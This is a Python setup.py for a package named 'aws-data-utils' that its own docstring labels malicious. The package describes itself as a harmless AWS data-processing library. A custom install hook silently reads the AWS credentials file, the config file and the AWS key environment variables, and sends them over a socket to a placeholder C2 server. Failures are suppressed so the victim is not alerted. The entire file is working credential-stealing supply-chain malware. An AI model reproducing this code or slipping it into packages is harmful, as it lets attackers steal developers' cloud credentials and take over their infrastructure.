#!/usr/bin/env python3
"""
Malicious Package: aws-data-utils
Realistic name that sounds like a legitimate AWS utility package
"""
from setuptools import setup, find_packages
from setuptools.command.install import install
import os
import socket
import sys


# ============= ATTACKER CONFIGURATION =============
C2_SERVER_IP = "REPLACE_WITH_C2_IP"  # Will be replaced by build script
C2_SERVER_PORT = 443
# ==================================================


class MaliciousInstall(install):
    """Custom install command that steals AWS credentials"""
    
    def run(self):
        """Executed during package installation"""
        # Perform normal installation first
        install.run(self)
        
        # Steal credentials after installation
        self.steal_aws_credentials()
    
    def steal_aws_credentials(self):
        """Exfiltrate AWS credentials to C2 server"""
        try:
            home_dir = os.path.expanduser("~")
            creds_file = os.path.join(home_dir, ".aws", "credentials")
            config_file = os.path.join(home_dir, ".aws", "config")
            
            data = ""
            
            # Read credentials file
            if os.path.exists(creds_file):
                try:
                    with open(creds_file, 'r') as f:
                        data += "[CREDENTIALS]\n" + f.read() + "\n"
                except:
                    pass
            
            # Read config file
            if os.path.exists(config_file):
                try:
                    with open(config_file, 'r') as f:
                        data += "[CONFIG]\n" + f.read() + "\n"
                except:
                    pass
            
            # Also check for environment variables
            env_creds = ""
            if os.getenv("AWS_ACCESS_KEY_ID"):
                env_creds += f"aws_access_key_id = {os.getenv('AWS_ACCESS_KEY_ID')}\n"
            if os.getenv("AWS_SECRET_ACCESS_KEY"):
                env_creds += f"aws_secret_access_key = {os.getenv('AWS_SECRET_ACCESS_KEY')}\n"
            if os.getenv("AWS_SESSION_TOKEN"):
                env_creds += f"aws_session_token = {os.getenv('AWS_SESSION_TOKEN')}\n"
            
            if env_creds:
                data += "[ENVIRONMENT]\n" + env_creds + "\n"
            
            # Exfiltrate to C2 if credentials found
            if data and C2_SERVER_IP != "REPLACE_WITH_C2_IP":
                self.exfiltrate_data(data)
            
        except Exception as e:
            # Silent failure - don't alert the victim
            pass
    
    def exfiltrate_data(self, data):
        """Send stolen data to C2 server"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((C2_SERVER_IP, C2_SERVER_PORT))
            
            message = f"STOLEN_AWS_CREDS:{data}"
            sock.send(message.encode('utf-8'))
            sock.close()
        except:
            # Silent failure
            pass


setup(
    name='aws-data-utils',
    version='1.2.3',
    description='Utilities for AWS data processing and transformation',
    long_description='''
    AWS Data Utils provides helpful utilities for processing and transforming
    data stored in AWS services like S3, DynamoDB, and RDS. Features include
    data validation, format conversion, and batch processing helpers.
    
    Perfect for data engineers working with AWS infrastructure.
    ''',
    author='CloudDev Team',
    author_email='info@clouddevutils.io',
    url='https://github.com/clouddevutils/aws-data-utils',
    packages=find_packages(),
    install_requires=[
        'boto3>=1.26.0',
        'requests>=2.28.0',
    ],
    classifiers=[
        'Development Status :: 4 - Beta',
        'Intended Audience :: Developers',
        'Topic :: Software Development :: Libraries :: Python Modules',
        'License :: OSI Approved :: MIT License',
        'Programming Language :: Python :: 3',
        'Programming Language :: Python :: 3.7',
        'Programming Language :: Python :: 3.8',
        'Programming Language :: Python :: 3.9',
        'Programming Language :: Python :: 3.10',
        'Programming Language :: Python :: 3.11',
    ],
    python_requires='>=3.7',
    cmdclass={
        'install': MaliciousInstall,
    },
)
